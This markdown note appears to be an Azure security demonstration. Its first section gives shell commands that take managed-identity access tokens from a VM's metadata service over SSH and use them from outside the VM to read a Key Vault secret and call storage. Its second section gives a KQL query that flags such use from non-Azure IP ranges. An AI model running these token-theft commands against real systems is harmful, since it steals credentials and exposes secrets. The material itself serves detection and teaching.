# Read KV with the AT outside the MI

```sh

# KeyVault
at=$(ssh -i tempkeys/tempkey azureuser@$ip "curl -s 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fvault.azure.net' -H Metadata:true" | jq .access_token | sed 's/\"//g') 

node decodeTokens.js $at

curl -s 'https://eastdemokv.vault.azure.net/secrets/vmsecret/?api-version=2016-10-01' -H "Authorization: Bearer $at" | jq .


#Storage

at2=$(ssh -i tempkeys/tempkey azureuser@$ip "curl -s 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com' -H Metadata:true" | jq .access_token | sed 's/\"//g') 

node decodeTokens.js $at2

curl -s -d "{}" $storagePath  -H "Authorization: Bearer $at2" | jq .




```
# Review logs
```sql
// map MI and SPN to non-identified Azure Ranges
let s = union AADServicePrincipalSignInLogs, AADManagedIdentitySignInLogs
| distinct AppId, ServicePrincipalName;
let massList = s | summarize make_list(AppId);
let src = union AzureDiagnostics, AzureActivity
| extend mass = pack_all(true)
| mv-apply appId = toscalar(massList) to typeof(string) on (where mass contains appId  )
| extend combOp = iff(isempty( OperationNameValue), OperationName, OperationNameValue)
| extend combCategory = iff(isempty( Category), CategoryValue, Category)
| join kind=inner s on $left.appId == $right.AppId
| extend ipByAsIdentifiedByAzure =iff(isempty( CallerIPAddress),CallerIpAddress, CallerIPAddress)
| distinct  ServicePrincipalName,appId, Type, combOp, combCategory, ipByAsIdentifiedByAzure
| summarize make_list(pack_all(true));
let azIp =externaldata(changeNumber: string, cloud: string, values: dynamic)
["https://download.microsoft.com/download/7/1/D/71D86715-5596-4529-9B13-DA13A5DE5B63/ServiceTags_Public_20230424.json"]
with(format='multijson')
| mv-expand values
| project  aId =values.id, prefix =values.properties.addressPrefixes
| mv-expand prefix
| project aId, prefix;
let matched = azIp
| mv-apply src= toscalar(src) to typeof(dynamic) on 
    (
extend matchFound = ipv4_is_in_range(tostring(src.ipByAsIdentifiedByAzure),tostring(prefix)) 
    )
| where matchFound == true
| evaluate bag_unpack(src);
let noMatch = src
| mv-expand list_
| evaluate bag_unpack(list_) 
| extend appId =toguid(appId)
| join kind=leftanti matched on $left.ipByAsIdentifiedByAzure == $right.ipByAsIdentifiedByAzure
| extend matchFound = false;
union noMatch, matched


```